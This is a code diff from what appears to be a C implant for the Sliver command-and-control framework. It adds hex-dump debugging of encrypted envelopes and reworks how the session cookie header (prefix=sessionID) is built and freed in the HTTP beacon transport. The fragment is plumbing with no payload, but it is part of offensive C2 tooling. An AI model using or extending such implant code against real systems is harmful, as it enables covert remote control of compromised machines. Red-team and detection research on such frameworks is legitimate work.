@@ -917,7 +917,9 @@ BOOL HttpSend
 		PrintFormatW(L"Write Envelope: []\n");
 	}
 
+	PrintFormatA("----------------------------\n");
 	pMarshalledEnvelope = MarshalEnvelope(pEnvelope);
+	HexDump(pMarshalledEnvelope->pBuffer, pMarshalledEnvelope->cbBuffer);
 	pCipherText = SliverEncrypt(pConfig, pMarshalledEnvelope);
 	lpUri = CreateSessionURL(pConfig, pHttpClient);
 	if (lpUri == NULL) {
@@ -1008,10 +1010,6 @@ BOOL HttpCleanup
 {
 	DWORD i = 0;
 	if (pSliverHttpClient != NULL) {
-		if (pSliverHttpClient->lpCookiePrefix != NULL) {
-			FREE(pSliverHttpClient->lpCookiePrefix);
-		}
-
 		if (pSliverHttpClient->lpPathPrefix != NULL) {
 			FREE(pSliverHttpClient->lpPathPrefix);
 		}
@@ -1091,6 +1089,7 @@ BOOL HttpStart
 	DWORD dwSetCookieLength = 0;
 	WCHAR wszSetCookie[0x100];
 	LPWSTR lpTemp = NULL;
+	LPSTR lpCookiePrefix = NULL;
 
 	lpFullUri = StartSessionURL(pConfig, pHttpClient);
 	if (lpFullUri == NULL) {
@@ -1133,7 +1132,9 @@ BOOL HttpStart
 
 	lpTemp = StrChrW(wszSetCookie, L'=');
 	lpTemp[0] = L'\0';
-	pHttpClient->lpCookiePrefix = ConvertWcharToChar(wszSetCookie);
+	lpCookiePrefix = ConvertWcharToChar(wszSetCookie);
+	pHttpClient->pHttpConfig->AdditionalHeaders[Cookie] = ALLOC(lstrlenA(pConfig->szSessionID) + lstrlenA(lpCookiePrefix) + 2);
+	wsprintfA(pHttpClient->pHttpConfig->AdditionalHeaders[Cookie], "%s=%s", lpCookiePrefix, pConfig->szSessionID);
 	Result = TRUE;
 CLEANUP:
 	if (lpRespData != NULL) {
@@ -1146,6 +1147,10 @@ CLEANUP:
 
 	if (lpFullUri != NULL) {
 		FREE(lpFullUri);
+	}
+
+	if (lpCookiePrefix != NULL) {
+		FREE(lpCookiePrefix);
 	}
 
 	if (pEncryptedSessionInit != NULL) {
